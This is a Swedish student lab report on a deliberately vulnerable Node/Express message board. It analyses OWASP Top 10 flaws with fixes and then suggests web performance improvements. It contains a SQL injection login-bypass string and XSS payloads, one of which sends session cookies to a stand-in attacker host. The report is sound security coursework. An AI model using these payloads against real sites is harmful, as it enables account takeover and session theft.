Ingela Bladh (ib222dp)

# Rapport, Labb 2

## Säkerhetsproblem

### Injektion

Injektion innebär att opålitlig data skickas till en programtolk som en del av ett kommando eller en fråga. Denna 
opålitliga data kan lura programtolken till att utföra kommandon eller ge åtkomst till data utan auktorisering [1, s. 6]
. Jag kunde i denna applikation logga in genom att ange Bob' OR '1'='1 som lösenord, eftersom sökfrågan i metoden 
"checkLogin" i filen "login.js" blir SELECT * FROM user WHERE ... password = 'Bob' OR '1'='1'.  
Injektion undviks genom att använda parametriserade sökfrågor (till exempel "SELECT * FROM user WHERE ... password = ?", 
[password]), eftersom dessa förhindrar förvirring rörande specialtecken som '. Till exempel skulle databasen i detta 
fall sökas igenom för att hitta ett lösenord som innehåller ' OR '1='1 [2]. 
Validering av indata och vitlistning av tecken rekommenderas också, men är inte ett fullständigt skydd eftersom många 
applikationer behöver acceptera specialtecken som indata [1, s. 7].  

### Bristande autentisering och sessionshantering

Funktioner som har med autentisering och sessionshantering att göra implementeras ofta på ett felaktigt sätt. På så 
sätt kan angripare komma över lösenord, nycklar eller sessionstokens, eller utnyttja andra brister i implementationen
för att anta andra användares identiteter [1, s. 6]. I denna applikation förstörs inte sessionen vid utloggning. Detta
betyder att om en användare loggar in på applikationen på en publik dator och sedan loggar ut, så kan en annan användare
komma in på den tidigare användarens konto genom att trycka på bakåt-knappen eller skriva in `.../message` i 
webbläsarens adressfält. I detta fall bör man se till att sessionen förstörs vid utloggning, och att sessionen 
förstörs automatiskt efter en viss tid (eftersom användare kan använda applikationen på en publik dator och sedan stänga 
webbläsaren utan att logga ut) [1, s. 8].

### XSS (cross-site scripting)

XSS-brister uppstår när en applikation accepterar data och skickar den till en webbläsare utan ordentlig
validering eller escape-sekvenser. Via XSS kan angripare exekvera skript i offrets webbläsare, vilka kan stjäla 
sessioner, förvanska webbplatser eller dirigera om användaren till skadliga webbplatser [1, s. 6].  
I denna applikation går det att skriva `<a href='#' onclick='alert(document.cookie)'>Hej</a>` som ett meddelande, 
och när man sedan klickar på länken syns sessionskakan i ett varningsfönster. Detta innebär att en angripare kan stjäla 
en användares sessionskaka och på så sätt få tillgång till dennes konto, genom att skriva till exempel 
`<script>document.location='http://attackersite/'+document.cookie</script>` som ett meddelande [2].  
XSS-brister undviks genom att validera indata och filtrera utdata [3]. Vitlistning av tillåtna tecken rekommenderas men 
är inte ett fullständigt skydd. Vilka escape-sekvenser som bör användas för utdata beror på kontexten som utdatan ska 
placeras i (till exempel HTML, Javasript eller CSS) [1, s. 9]. Stöld av sessionskakor kan förhindras genom att använda 
attributet "httpOnly" på en kaka, eftersom den då endast är tillgänglig via http eller https, och inte via till exempel 
Javascript [4]. Attributet "httpOnly" bör därför ändras från "false" till "true" i filen "express.js".

### Osäkra direkta objektreferenser

En direkt objektreferens inträffar när en utvecklare exponerar en referens till ett internt implementationsobjekt, som
till exempel en fil, en katalog eller en databasnyckel. Vid avsaknad av åtkomstkontroll eller annat skydd kan angripare
manipulera dessa referenser för att få åtkomst till data utan auktorisering [1, s. 6].  
I denna applikation exponeras en inloggad användares databasnyckel och roll ("admin" eller "user") i konsolfönstret om 
man skriver `.../test` i adressfältet. Denna funktion bör därför tas bort från filen "index.js". Varje meddelandes 
databasnyckel exponeras också i ett dolt fält i HTML-koden, och eftersom ingen åtkomstkontroll görs i funktionerna som 
har med radering av meddelanden att göra, skulle en användare kunna radera en annan användares meddelanden.  
Man kan undvika osäkra direkta objektreferenser genom att använda indirekta objektreferenser per användare eller per 
session. Till exempel kan en användare få se en numrerad dropdown-lista med de resurser hen har tillgång till, 
och applikationen kartlägger sedan vilken databasnyckel som numret framför resursen som användaren har valt matchar. Om 
direkta objektreferenser används är det viktigt att kontrollera att användaren är auktoriserad att få tillgång till det 
begärda objektet [1, s. 10].  

### Exponering av känslig data

Känslig data bör inte lagras eller transporteras i klartext. Angripare kan stjäla eller ändra dåligt skyddad data för 
att genomföra till exempel kreditkortsbedrägeri eller identitetsstöld [1, s. 6]. I denna applikation verkar lösenord 
sparas i klartext i databasen.  
Lösenord ska lagras med en algoritm som utformats speciellt för lösenordsskydd, som till exempel bcrypt, PBKDF2 eller 
scrypt [1, s. 12]. De ska inte krypteras utan hashas, eftersom krypterade lösenord kan dekrypteras. För att skydda mot 
att läckta hashade lösenord slås upp mot regnbågstabeller ska ett slumpat salt läggas till varje lösenord. För att 
försvåra "brute force"-attacker kan man hasha lösenordet flera gånger [3].  

### Saknad åtkomstkontroll på funktionsnivå

Utöver åtkomstkontroller på klienten måste applikationer också utföra åtkomstkontroller på servern varje gång en 
funktion anropas. Utan dessa kontroller kommer angripare att via egna anrop kunna komma åt funktionalitet utan
auktorisering [1, s. 6]. I denna applikation kan man komma åt meddelandena utan att logga in, genom att skriva in 
`.../message/data` i webbläsarens adressfält. Detta kan undvikas till exempel genom att lägga till en åtkomstkontroll 
i funktionen "getMessages" i filen "messageModel.js". Skripten "Message.js" och "MessageBoard.js" och anropet till 
metoden "getMessages" i "MessageBoard.js" bör endast inkluderas i det lösenordsskyddade dokumentet. Det är inte 
tillräckligt att inte visa länkar eller knappar till skyddade funktioner, utan åtkomstkontroller måste också utföras på 
servern [1, s. 13].

### CSRF (cross-site request forgery)

En CSRF-attack innebär att en inloggad användares webbläsare tvingas att skicka ett förfalskat http-anrop - som 
innehåller användarens sessionskaka och annan automatiskt inkluderad autentiseringsinformation - till en sårbar 
webbapplikation. På så sätt kan angriparen tvinga användarens webbläsare att skapa anrop som den sårbara applikationen 
tror är legitima anrop från användaren [1, s. 6]. Denna applikation verkar inte ha tillräckligt skydd mot CSRF-attacker 
eftersom det inte finns några dolda fält med slumpmässigt genererade värden i formulären.  
Att förhindra CSRF-attacker innebär oftast att inkludera en oförutsägbar token i varje http-anrop. Dessa tokens bör vara 
unika åtminstone per användarsession. Det bästa alternativet är att inkludera en unik token i ett dolt fält, eftersom en 
token kan exponeras om den skickas i URL:en eller som en URL-parameter [1, s. 14]. Det verifieras sedan på servern att 
en korrekt token finns med i http-anropet. Detta kallas för "Synchronizer Token Pattern", och skyddar mot CSRF-attacker 
eftersom en angripare måste känna till det slumpmässigt genererade värdet för att kunna skicka ett förfalskat anrop. För 
att skydd mot CSRF-attacker ska fungera är det viktigt att inte ha några XSS-brister i sin applikation, eftersom en 
angripare annars kan få tag på en token via XSS [5]. 

### Användning av komponenter med kända sårbarheter

Komponenter, som till exempel bibliotek, ramverk och andra programvarumoduler, körs nästan alltid med fullständiga 
rättigheter. Om en sårbar komponent utnyttjas kan en sådan attack medföra allvarlig dataförlust eller serverövertagande.
Om en applikation använder komponenter med kända sårbarheter kan detta undergräva applikationens försvarsmekanismer och
möjliggöra en rad attacker [1, s. 6]. I denna applikation verkar en gammal version av Jquery användas (v 1.10.2).  
Eftersom de flesta tillverkare av komponenter inte åtgärdar säkerhetsproblem i äldre versioner är det viktigt att 
uppdatera till den senaste versionen av en komponent [1, s. 15].

## Prestandaproblem

###Gör färre http-anrop

Eftersom 80 till 90 % av en användares svarstid går åt till att göra http-anrop för alla komponenter på en HTML-sida (
till exempel Javascript och CSS), kan man förbättra svarstiden genom att inkludera färre komponenter och därmed minska 
antalet http-anrop [6, s. 10]. I denna applikation görs onödiga anrop till "materialize.js", 
"ie10-viewport-bug-workaround.js" och "materialize.min.css", eftersom dessa komponenter inte finns på de angivna 
platserna i applikationen ("bootstrap-theme.css" och "bootstrap.js" behöver däremot inkluderas). Det är också onödigt 
att ha med raden `html {background:url(/static/images/b.jpg);}` i filerna "admin.html" och "index.html", eftersom 
bakgrundsbilden redan har satts genom raden `background-image:url(/static/images/logo.png);`.

###Använd en CDN-tjänst

En webbsidas svarstid påverkas av avståndet mellan användaren och webbservern. Genom att använda en CDN-tjänst, det vill 
säga en samling webbservrar som är utspridda på flera platser, kan svarstider för http-anrop till komponenter förbättras 
[6, s. 18-19]. I denna applikation skulle Bootstrap kunna levereras av MaxCDN [7], medan Jquery skulle kunna levereras 
av MaxCDN, Google CDN, Microsoft CDN, CDNJS CDN eller jsDelivr CDN [8].

###Använd Expires-headers

Webbläsare använder en cache för att minska antalet http-anrop och storleken på http-svar, så att webbsidor kan laddas 
fortare. Med hjälp av en Expires-header kan en webbserver tala om för klienten att den kan använda den cachade 
komponenten fram till den tidpunkt som specifierats i headern. Detta innebär att klienten kan hämta komponenten direkt 
från cachen utan att först behöva göra ett anrop till servern för att kontrollera om den cachade komponenten kan 
användas. Ett alternativ till Expires-headern är Cache-Control-headern, som introducerades i HTTP/1.1. Expires-headern 
behöver endast inkluderas i applikationer som ska kunna användas i webbläsare som inte stöder HTTP/1.1. Om man 
inkluderar både Cache-Control-headern med direktivet max-age och Expires-headern kommer direktivet max-age att 
överskugga Expires-headern. En Expires-header eller Cache-Control-header med en tidpunkt specifierad till till exempel 
30 dagar från idag bör inkluderas i varje komponent som inte ändras särskilt ofta. Ett HTML-dokument har oftast ingen 
Expires-header eller Cache-Control-header eftersom det innehåller dynamiskt innehåll som uppdateras vid varje anrop 
[6, s. 7-8, 22-26].  

I denna applikation skulle koden i filen "express.js" kunna skrivas om så att olika headers används för HTML-dokumenten 
och för komponenterna.  

För komponenterna skulle direktiven i Cache-Control-headern kunna ändras på följande vis:  
+ Direktiven no-cache, no-store och must-revalidate tas bort, eftersom dessa förhindrar att komponenterna cachas och 
orsakar onödiga http-anrop
+ Direktivet private ändras till public, så att komponenterna även kan cachas i en proxy-cache
+ Direktivet max-age läggs till, till exempel med värdet 30 dagar i framtiden (vilket uttrycks i sekunder)  

I det lösenordsskyddade HTML-dokumentet skulle en Cache-Control-header med direktiven public och no-cache kunna 
inkluderas. På detta sätt kan dokumentet cachas i en proxy-cache, men det släpps inte från cachen förrän klientens 
autentiseringsinformation har verifierats på servern.  

Det finns inte några riktlinjer i http-specifikationen för Pragma-headern, och att använda den har oftast ingen effekt. 
Denna header kan därför tas bort i filen "express.js" [9].

###Använd Gzip

Med hjälp av komprimeringsprogrammet Gzip kan storleken på http-svar minskas, vilket leder till kortare svarstider. 
Webbklienter visar att de stöder komprimering i Accept-Encoding-headern i ett http-anrop (till exempel Accept-Encoding: 
gzip, deflate). Om webbservern ser denna header i anropet kan den komprimera svaret med hjälp av en av de metoder som 
klienten skickat med (gzip är den populäraste och mest effektiva komprimeringsmetoden). Med hjälp av 
Content-Encoding-headern kan webbservern visa att svaret är komprimerat och vilken metod som har använts (till exempel 
Content-Encoding: gzip). Det är en bra idé att komprimera HTML-dokument, Javascript, CSS-filer, JSON och XML. Bilder och 
PDF-dokument bör däremot inte komprimeras med Gzip eftersom de redan är komprimerade. För att en proxy-cache ska cacha 
både okomprimerade och komprimerade versioner av http-svar måste Vary-headern inkluderas i svaret (Vary: Accept-Encoding
) [6, s. 29-33].  
I denna applikation kan mellanprogramvaran "compression" installeras. Om man sedan lägger till den bortkommenterade 
kodraden `var compression = require("compression");` igen, och lägger till kodraden `app.use(compression());` ovanför 
raden `app.use("/static", head, express.static(__dirname + "/../appModules/siteViews/static/"));` i filen "express.js", 
kommer http-svaren att komprimeras med Gzip [10].

###Placera CSS längst upp på HTML-sidan

I många webbläsare förhindras progressiv rendering om man placerar CSS längst ner i ett HTML-dokument. Webbläsare 
blockerar rendering för att inte behöva rita om sidelement om deras stilar ändras, och visar därför inga synliga 
komponenter förrän CSS-filen längst ner har laddats. Detta kan leda till att en användare endast ser en tom vit skärm, 
vilket ger intrycket av att sidan laddas långsamt. Därför är det bäst att placera CSS-filer längst upp på en HTML-sida 
[6, s. 38-41]. I denna applikation skulle CSS-koden i filerna "admin.html" och "index.html" kunna flyttas till en extern 
fil och sedan inkluderas i HTML-dokumentets "head".

###Placera Javascript längst ner på HTML-sidan

Om man placerar Javascript längst upp på en HTML-sida kan innehåll nedanför skriptet inte renderas och komponenter 
nedanför skriptet inte laddas ner förrän skriptet är helt laddat. Därför är det bäst att placera Javascript 
längst ner på sidan [6, s. 49]. I denna applikation kan "jquery.js", "Message.js" och "MessageBoard.js" flyttas från 
"head" till längst ner i "body". 

###Placera Javascript och CSS i externa filer

Fastän externa CSS-filer och Javascript-filer leder till fler http-anrop, kan det ändå löna sig att ha CSS och 
Javascript i externa filer, eftersom sådana filer i allmänhet cachas, medan HTML-dokument som har dynamiskt innehåll i 
allmänhet inte cachas. Eftersom CSS och Javascript lyfts ut från HTML-dokumentet blir det mindre och går därför snabbare 
att läsa in. Om Javascript och CSS bör placeras i externa filer eller inte beror på tre faktorer:  
+ Hur många gånger en sida besöks per användare - ju färre gånger samma användare besöker sidan, desto mer lönar det sig 
att ha CSS-kod och Javascript direkt i HTML-dokumentet, eftersom komponenterna troligen ändå har rensats från 
användarens cache sedan dennes senaste besök.
+ Hur ofta sidor på webbplatsen besöks med komponenter redan i cachen - ju oftare desto mer lönar det sig att ha 
CSS-kod och Javascript i externa filer.
+ Hur många sidor på webbplatsen som använder samma CSS-kod och Javascript - ju fler sidor som använder samma kod, desto 
mer lönar det sig att använda externa filer [6, s. 55-58].  

Eftersom denna applikation troligen kommer att användas flera gånger per dag och besökas med komponenter redan i cachen,
och eftersom CSS-kodstyckena i filerna "admin.html" och "index.html" är identiska, skulle det löna sig att flytta den 
koden till en extern CSS-fil.

###Minifiera Javascript

Minifiering innebär att ta bort onödiga tecken från kod för att minska dess storlek, och därmed förkorta laddningstider. 
Alla kommentarer och blanktecken tas bort. I denna applikation skulle "Message.js" och "MessageBoard.js" kunna 
minifieras med hjälp av ett verktyg som JSMin, medan CSS-koden i filerna "admin.html" och "index.html" skulle kunna 
optimeras genom borttagning av blanktecken och klasser som inte används [6, s. 69-75]. Filerna "bootstrap.js", 
"bootstrap.css", "bootstrap-theme.css" och "jquery.js" skulle kunna ersättas med de minifierade filer som MaxCDN 
erbjuder [7, 8]. 

###Undvik omdirigeringar

Omdirigeringar används för att omdirigera användare från en URL till en annan. Det finns olika typer av omdirigeringar, 
men 301 och 302 är de som används mest. Omdirigeringar används mest för HTML-dokument, men de kan också användas för 
anrop till komponenter i dokumentet (till exempel bilder). Omdirigeringar kan användas till exempel för att analysera 
trafik på en webbplats eller för att skapa URL:er som är lättare att komma ihåg, men de gör att sidor laddas långsammare. 
De försenar leveransen av hela HTML-dokumentet, och eftersom inget innehåll kan renderas och inga komponenter kan laddas 
ner förrän HTML-dokumentet har laddats blir allting försenat. Därför är det bättre att använda alternativ till 
omdirigeringar som inte leder till att sidor laddas långsamt [6, s. 76-79].  
I denna applikation används omdirigeringar vid inloggning, utloggning och när en användare skriver in felaktiga 
inloggningsuppgifter. Omdirigeringarna vid utloggning och felaktig inloggning är kanske nödvändiga av säkerhetsskäl, men 
koden i filen "index.js" borde kunna skrivas om så att användaren inte omdirigeras till `.../message` efter en korrekt 
inloggning.

## Övergripande reflektioner



## Referenser

Nr  | Referens
--- | :------
[1] | OWASP, "OWASP Top 10 - 2013 - The ten most critical web application security risks", *OWASP*, september 2015 [Online] Tillgänglig: <https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013>. [Hämtad: 23 november, 2015].
[2] | M. Coates, "Application Security - Understanding, exploiting and defending against top web vulnerabilities", *Youtube*, mars 2014 [Online] Tillgänglig: <https://www.youtube.com/watch?v=sY7pUJU8a7U>. [Hämtad: 23 november, 2015].
[3] | J. Leitet, "Webbteknik II - HT13 - Webbsäkerhet", *Youtube*, november 2013 [Online] Tillgänglig: <https://www.youtube.com/watch?v=Gc_pc9TMEIk>. [Hämtad: 23 november, 2015].
[4] | Wikipedia, "HTTP cookie", *Wikipedia*, november 2015 [Online] Tillgänglig: <https://en.wikipedia.org/wiki/HTTP_cookie>. [Hämtad: 23 november, 2015].
[5] | OWASP, "Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet", *OWASP*, november 2015 [Online] Tillgänglig: <https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>. [Hämtad: 23 november, 2015].
[6] | S. Souders, *High Performance Web Sites: Essential knowledge for frontend engineers*. Sebastopol: O´Reilly Media, Inc., 2007.
[7] | Bootstrap, "Getting started", *Bootstrap*, [Online] Tillgänglig: <http://getbootstrap.com/getting-started/#download>. [Hämtad: 2 december 2015].
[8] | jQuery, "Download", *jQuery*, 2015 [Online] Tillgänglig: <http://jquery.com/download/>. [Hämtad: 2 december 2015].
[9] | M. Nottingham, "Caching Tutorial for Web Authors and Webmasters", *mark nottingham*, 2013 [Online] Tillgänglig: <https://www.mnot.net/cache_docs/>. [Hämtad: 2 december 2015].
[10]| D. Wilson, "compression", *GitHub*, september 2015 [Online] Tillgänglig: <https://github.com/expressjs/compression>. [Hämtad: 2 december 2015].